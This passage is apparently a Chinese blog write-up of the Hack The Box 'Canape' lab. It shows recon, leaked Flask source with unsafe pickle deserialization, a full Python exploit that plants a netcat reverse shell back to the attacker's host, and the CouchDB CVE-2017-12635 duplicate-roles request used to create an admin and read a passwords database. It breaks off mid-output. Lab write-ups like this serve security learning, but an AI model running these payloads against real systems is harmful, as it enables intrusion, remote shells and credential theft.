10.10.10.70</span><br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.70<br>Host is up (0.20s latency).<br>Not shown: 65533 filtered tcp ports (no-response)<br>PORT      STATE SERVICE VERSION<br>80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))<br>|_http-title: Simpsons Fan Site<br>| http-git: <br>|   10.10.10.70:80/.git/<br>|     Git repository found!<br>|     Repository description: Unnamed repository; edit this file <span class="hljs-string">&#x27;description&#x27;</span> to name the...<br>|     Last commit message: final <span class="hljs-comment"># Please enter the commit message for your changes. Li...</span><br>|     Remotes:<br>|_      http://git.canape.htb/simpsons.git<br>|_http-server-header: Apache/2.4.18 (Ubuntu)<br>65535/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   2048 8d:82:0b:31:90:e4:c8:85:b2:53:8b:a1:7c:3b:65:e1 (RSA)<br>|   256 22:<span class="hljs-built_in">fc</span>:6e:c3:55:00:85:0f:24:bf:f5:79:6c:92:8b:68 (ECDSA)<br>|_  256 0d:91:27:51:80:5e:2b:a3:81:0d:e9:d8:5c:9b:77:35 (ED25519)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br><span class="hljs-comment"># Nmap done at Sun Apr 10 17:32:41 2022 -- 1 IP address (1 host up) scanned in 209.89 seconds</span><br></code></pre></td></tr></table></figure><p>SSH版本存在用户名枚举漏洞，暂不考虑先放一边，80端口的Apache也没什么现成漏洞利用，可以访问80端口看看：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220410174434181.png" alt="image-20220410174434181"  /><p>页面有6个按钮其实只有两个，Simpsons Fan Site 以及Home都是原地TP，View Quotes与Character Quotes是同一个页面：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220410174606840.png" alt="image-20220410174606840"  /><p>一堆聊天信息，我拥有了几个潜藏的用户名。Submit Quote都是一个页面：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220410174656217.png" alt="image-20220410174656217"  /><p>我可以试着输入一些东西：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220410174925675.png" alt="image-20220410174925675"  /><p>以post方式提交到了当前页面，抱歉我还是没能看出目标后台运行的什么脚本语言环境，我记得nmap为我扫出过一个.git目录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">PORT      STATE SERVICE VERSION<br>80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))<br>|_http-title: Simpsons Fan Site<br>| http-git: <br>|   10.10.10.70:80/.git/<br></code></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220410175322853.png" alt="image-20220410175322853"  /><p>在config中有另一个域名：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">[core]<br>repositoryformatversion = 0<br>filemode = <span class="hljs-literal">true</span><br>bare = <span class="hljs-literal">false</span><br>logallrefupdates = <span class="hljs-literal">true</span><br>[remote <span class="hljs-string">&quot;origin&quot;</span>]<br>url = http://git.canape.htb/simpsons.git<br>fetch = +refs/heads/*:refs/remotes/origin/*<br>[branch <span class="hljs-string">&quot;master&quot;</span>]<br>remote = origin<br>merge = refs/heads/master<br></code></pre></td></tr></table></figure><p>可以把其添加到hosts文件中尝试访问：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">10.10.10.70 git.canape.htb<br></code></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220410214012368.png" alt="image-20220410214012368"  /><p>一片空白。要不试着git clone 一下config中的url：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> http://git.canape.htb/simpsons.git<br>正克隆到 <span class="hljs-string">&#x27;simpsons&#x27;</span>...<br>remote: Counting objects: 49, <span class="hljs-keyword">done</span>.<br>remote: Compressing objects: 100% (47/47), <span class="hljs-keyword">done</span>.<br>remote: Total 49 (delta 18), reused 0 (delta 0)<br>展开对象中: 100% (49/49), 163.16 KiB | 97.00 KiB/s, 完成.<br></code></pre></td></tr></table></figure><p>这便是克隆之后的目录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ls</span><br>__init__.py  static  templates<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs python">cat __init__.py <br><span class="hljs-keyword">import</span> couchdb<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> cPickle<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, request<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><br>app = Flask(__name__)<br>app.config.update(<br>    DATABASE = <span class="hljs-string">&quot;simpsons&quot;</span><br>)<br>db = couchdb.Server(<span class="hljs-string">&quot;http://localhost:5984/&quot;</span>)[app.config[<span class="hljs-string">&quot;DATABASE&quot;</span>]]<br><br><span class="hljs-meta">@app.errorhandler(<span class="hljs-params"><span class="hljs-number">404</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">page_not_found</span>(<span class="hljs-params">e</span>):<br>    <span class="hljs-keyword">if</span> random.randrange(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>) &gt; <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(random.choice(string.ascii_uppercase + string.digits) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(random.randrange(<span class="hljs-number">50</span>, <span class="hljs-number">250</span>)))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/quotes&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">quotes</span>():<br>    quotes = []<br>    <span class="hljs-keyword">for</span> <span class="hljs-built_in">id</span> <span class="hljs-keyword">in</span> db:<br>        quotes.append(&#123;<span class="hljs-string">&quot;title&quot;</span>: db[<span class="hljs-built_in">id</span>][<span class="hljs-string">&quot;character&quot;</span>], <span class="hljs-string">&quot;text&quot;</span>: db[<span class="hljs-built_in">id</span>][<span class="hljs-string">&quot;quote&quot;</span>]&#125;)<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;quotes.html&#x27;</span>, entries=quotes)<br><br>WHITELIST = [<br>    <span class="hljs-string">&quot;homer&quot;</span>,<br>    <span class="hljs-string">&quot;marge&quot;</span>,<br>    <span class="hljs-string">&quot;bart&quot;</span>,<br>    <span class="hljs-string">&quot;lisa&quot;</span>,<br>    <span class="hljs-string">&quot;maggie&quot;</span>,<br>    <span class="hljs-string">&quot;moe&quot;</span>,<br>    <span class="hljs-string">&quot;carl&quot;</span>,<br>    <span class="hljs-string">&quot;krusty&quot;</span><br>]<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/submit&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">submit</span>():<br>    error = <span class="hljs-literal">None</span><br>    success = <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&quot;POST&quot;</span>:<br>        <span class="hljs-keyword">try</span>:<br>            char = request.form[<span class="hljs-string">&quot;character&quot;</span>]<br>            quote = request.form[<span class="hljs-string">&quot;quote&quot;</span>]<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> char <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> quote:<br>                error = <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">any</span>(c.lower() <span class="hljs-keyword">in</span> char.lower() <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> WHITELIST):<br>                error = <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-comment"># TODO - Pickle into dictionary instead, `check` is ready</span><br>                p_id = md5(char + quote).hexdigest()<br>                outfile = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/tmp/&quot;</span> + p_id + <span class="hljs-string">&quot;.p&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>)<br>                outfile.write(char + quote)<br>                outfile.close()<br>                success = <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> ex:<br>            error = <span class="hljs-literal">True</span><br><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;submit.html&quot;</span>, error=error, success=success)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/check&quot;</span>, methods=[<span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>():<br>    path = <span class="hljs-string">&quot;/tmp/&quot;</span> + request.form[<span class="hljs-string">&quot;id&quot;</span>] + <span class="hljs-string">&quot;.p&quot;</span><br>    data = <span class="hljs-built_in">open</span>(path, <span class="hljs-string">&quot;rb&quot;</span>).read()<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;p1&quot;</span> <span class="hljs-keyword">in</span> data:<br>        item = cPickle.loads(data)<br>    <span class="hljs-keyword">else</span>:<br>        item = data<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Still reviewing: &quot;</span> + item<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run()<br></code></pre></td></tr></table></figure><p>可以看到目标数据库是couchdb，运行在目标5984，对内不对外。主要是末尾的 item &#x3D; cPickle.loads(data)，它可能会存在一些不安全的反序列化。靠着这条线索，我又找到了以下脚本，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">这是脚本开发者的个人博客https://0xdf.gitlab.io/，<br><br>这是原文地址：https://0xdf.gitlab.io/2018/09/15/htb-canape.html<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> cPickle<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit</span>(<span class="hljs-title class_ inherited__">object</span>):<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, cmd</span>):<br>        self.cmd = cmd<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (os.system, (<span class="hljs-string">&#x27;echo moe &amp;&amp; &#x27;</span> + self.cmd,))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) != <span class="hljs-number">3</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125; [ip] [port]&quot;</span>.<span class="hljs-built_in">format</span>(sys.argv[<span class="hljs-number">0</span>]))<br>        sys.exit()<br><br>    ip = sys.argv[<span class="hljs-number">1</span>]<br>    port = sys.argv[<span class="hljs-number">2</span>]<br>    cmd = <span class="hljs-string">&quot;rm /tmp/0xdf; mkfifo /tmp/0xdf; cat /tmp/0xdf | /bin/sh -i 2&gt;&amp;1 | nc &#123;&#125; &#123;&#125; &gt; /tmp/0xdf&quot;</span>.<span class="hljs-built_in">format</span>(ip, port)<br>    exploit = cPickle.dumps(Exploit(cmd))<br><br>    char = exploit[:-<span class="hljs-number">1</span>]<br>    quote = exploit[-<span class="hljs-number">1</span>:]<br>    id_ = md5(char+quote).hexdigest()<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Filename will be: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(id_))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Exploit:\n&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(exploit))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Sending exploit...&quot;</span>)<br>    r = requests.post(<span class="hljs-string">&#x27;http://10.10.10.70/submit&#x27;</span>, data = &#123;<span class="hljs-string">&#x27;character&#x27;</span>: char, <span class="hljs-string">&#x27;quote&#x27;</span>: quote&#125;)<br>    <span class="hljs-keyword">if</span> r.status_code != <span class="hljs-number">200</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-] Error submitting exploit to /submit&quot;</span>)<br>        sys.exit()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Exploit successfully submitted&quot;</span>)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Triggering exploit with /check, id = &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(id_))<br>    <span class="hljs-keyword">try</span>:<br>        r = requests.post(<span class="hljs-string">&#x27;http://10.10.10.70/check&#x27;</span>, data = &#123;<span class="hljs-string">&#x27;id&#x27;</span>: id_&#125;, timeout=<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>用法也很简单：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># python2 payload.py 10.10.16.9 4443</span><br>[*] Filename will be: d9ea1f56d0d9040d3a1b0cf1433ba478<br>[*] Exploit:<br>cposix<br>system<br>p1<br>(S<span class="hljs-string">&#x27;echo moe &amp;&amp; rm /tmp/0xdf; mkfifo /tmp/0xdf; cat /tmp/0xdf | /bin/sh -i 2&gt;&amp;1 | nc 10.10.16.9 4443 &gt; /tmp/0xdf&#x27;</span><br>tRp2<br>.<br>[+] Sending exploit...<br>[+] Exploit successfully submitted<br>[+] Triggering exploit with /check, <span class="hljs-built_in">id</span> = d9ea1f56d0d9040d3a1b0cf1433ba478<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">─<span class="hljs-comment"># nc -lvnp 4443                                    </span><br>listening on [any] 4443 ...<br>connect to [10.10.16.9] from (UNKNOWN) [10.10.10.70] 37982<br>/bin/sh: 0: can<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$ whoami</span><br><span class="hljs-string">www-data</span><br><span class="hljs-string">$ </span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></code></pre></td></tr></table></figure><p>介于目标机器上存有couchdb，我觉得像是作者安排的提权路线为基于couchdb提权，那么我可以搜寻一下相关漏洞：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit couchdb<br>-------------------------------------------------------- ---------------------------------<br> Exploit Title                                          |  Path<br>-------------------------------------------------------- ---------------------------------<br>Apache CouchDB - Arbitrary Command Execution (Metasploi | linux/remote/45019.rb<br>Apache CouchDB 1.5.0 - <span class="hljs-string">&#x27;uuids&#x27;</span> Denial of Service        | multiple/dos/32519.txt<br>Apache CouchDB 1.7.0 / 2.x &lt; 2.1.1 - Remote Privilege E | linux/webapps/44498.py<br>Apache CouchDB 2.0.0 - Local Privilege Escalation       | windows/local/40865.txt<br>Apache CouchDB 2.3.0 - Cross-Site Scripting             | multiple/webapps/46406.txt<br>Apache CouchDB 2.3.1 - Cross-Site Request Forgery / Cro | multiple/webapps/46595.txt<br>Apache CouchDB &lt; 2.1.0 - Remote Code Execution          | linux/webapps/44913.py<br>-------------------------------------------------------- ---------------------------------<br></code></pre></td></tr></table></figure><p>我发现了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Apache CouchDB 2.0.0 - Local Privilege Escalation<br></code></pre></td></tr></table></figure><p>哦可惜他是windows，我的目标是linux，不适用。没关系还有：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Apache CouchDB 1.7.0 / 2.x &lt; 2.1.1 - Remote Privilege Escalation<br></code></pre></td></tr></table></figure><p>哦远程升级特权，目标couchdb数据库只对内，或许我会有开启对外访问的权限或方法，或者我本地模拟一下远程，访问localhost一样可以被视为远程， 我可以看一眼漏洞利用脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit -x linux/webapps/44498.py<br></code></pre></td></tr></table></figure><p>漏洞利用脚本告诉我漏洞编号为：CVE-2017-12635。我从脚本中看不出什么来，我便搜寻了相关资料，找到了这个url：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2017-12635<br></code></pre></td></tr></table></figure><p>Apache CouchDB 是一个开源的面向文档的 NoSQL 数据库，用 Erlang 实现。CouchDB 使用多种格式和协议来存储、传输和处理其数据。它使用 JSON 存储数据，使用 MapReduce 作为其查询语言的 JavaScript，以及作为 API 的 HTTP。</p><p>由于基于 Erlang 的 JSON 解析器和基于 JavaScript 的 JSON 解析器的差异，在 1.7.0 之前的 Apache CouchDB 和 2.1.1 之前的 2.x 中，可以提交<code>_users</code>具有重复键的文档以<code>roles</code>用于数据库内的访问控制，包括<code>_admin</code>表示管理用户的特殊情况角色。</p><p>例如添加正常用户的请求是这样的：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">PUT</span> <span class="hljs-string">/_users/org.couchdb.user:vulhub</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>your-ip:5984<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>90<br><br><span class="language-prolog">&#123;</span><br><span class="language-prolog">  <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;user&quot;</span>,</span><br><span class="language-prolog">  <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;vulhub&quot;</span>,</span><br><span class="language-prolog">  <span class="hljs-string">&quot;roles&quot;</span>: [<span class="hljs-string">&quot;_admin&quot;</span>],</span><br><span class="language-prolog">  <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;vulhub&quot;</span></span><br><span class="language-prolog">&#125;</span><br></code></pre></td></tr></table></figure><p>访问限制目录会返回 403 错误：<code>&#123;&quot;error&quot;: &quot;forbidden&quot;, &quot;reason&quot;: &quot;Only _admin may set roles&quot;&#125;</code>，这意味着只有管理员可以访问限制级目录，但是可以通过发送包含重复<strong>角色</strong>的请求来绕过限制。像这样：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">PUT</span> <span class="hljs-string">/_users/org.couchdb.user:vulhub</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>your-ip:5984<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>108<br><br><span class="language-prolog">&#123;</span><br><span class="language-prolog">  <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;user&quot;</span>,</span><br><span class="language-prolog">  <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;vulhub&quot;</span>,</span><br><span class="language-prolog">  <span class="hljs-string">&quot;roles&quot;</span>: [<span class="hljs-string">&quot;_admin&quot;</span>],</span><br><span class="language-prolog">  <span class="hljs-string">&quot;roles&quot;</span>: [],</span><br><span class="language-prolog">  <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;vulhub&quot;</span></span><br><span class="language-prolog">&#125;</span><br></code></pre></td></tr></table></figure><p>就会成功创建一个用户vulhub，而且是带有密码vulhub。那么我可以利用该漏洞创建为自己创建一个管理员账户：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -X PUT -d <span class="hljs-string">&#x27;&#123;&quot;type&quot;:&quot;user&quot;,&quot;name&quot;:&quot;world&quot;,&quot;roles&quot;:[&quot;_admin&quot;],&quot;roles&quot;:[],&quot;password&quot;:&quot;world&quot;&#125;&#x27;</span> localhost:5984/_users/org.couchdb.user:world -H <span class="hljs-string">&quot;Content-Type:application/json&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@canape:/$ curl -X PUT -d <span class="hljs-string">&#x27;&#123;&quot;type&quot;:&quot;user&quot;,&quot;name&quot;:&quot;world&quot;,&quot;roles&quot;:[&quot;_admin&quot;],&quot;roles&quot;:[],&quot;password&quot;:&quot;world&quot;&#125;&#x27;</span> localhost:5984/_users/org.couchdb.user:world -H <span class="hljs-string">&quot;Content-Type:application/json&quot;</span><br>&lt;_users/org.couchdb.user:world -H <span class="hljs-string">&quot;Content-Type:application/json&quot;</span>            <br>&#123;<span class="hljs-string">&quot;ok&quot;</span>:<span class="hljs-literal">true</span>,<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-string">&quot;org.couchdb.user:world&quot;</span>,<span class="hljs-string">&quot;rev&quot;</span>:<span class="hljs-string">&quot;1-b485f086ac0935beb3e4567583583962&quot;</span>&#125;<br>www-data@canape:/$ <br></code></pre></td></tr></table></figure><p>我看起来像是成功了。那么我可以尝试本地访问一些数据库信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl http://world:world@localhost:5984/passwords<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@canape:/$ curl http://world:world@localhost:5984/passwords<br>curl http://world:world@localhost:5984/passwords<br>&#123;<span class="hljs-string">&quot;db_name&quot;</span>:<span class="hljs-string">&quot;passwords&quot;</span>,<span class="hljs-string">&quot;update_seq&quot;</span>:<span 